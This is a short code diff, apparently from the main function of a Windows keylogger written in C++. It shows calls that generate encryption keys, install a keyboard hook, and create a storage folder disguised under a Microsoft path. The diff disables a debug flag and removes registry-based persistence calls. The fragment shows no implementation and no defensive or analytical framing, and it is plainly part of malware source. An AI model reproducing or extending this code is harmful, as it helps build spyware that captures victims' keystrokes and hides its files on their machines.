@@ -4,17 +4,15 @@
 #include "sys.h"
 #include "encrypt.h"
 
-#define DEBUG
+//#define DEBUG
 
 int main() {
 #ifdef DEBUG
-  std::cout << "addreg: " << Sys::AddToRegistry() << "\n";
 #endif
 
 #ifndef DEBUG
   Crypt::GenerateKeys();
   KeyHook::InstallHook();
-  Sys::AddToRegistry(path);
 
   Stream::MakeDir(Stream::GetPath("\\Microsoft\\blxr"));
   Stream::MakeFile();
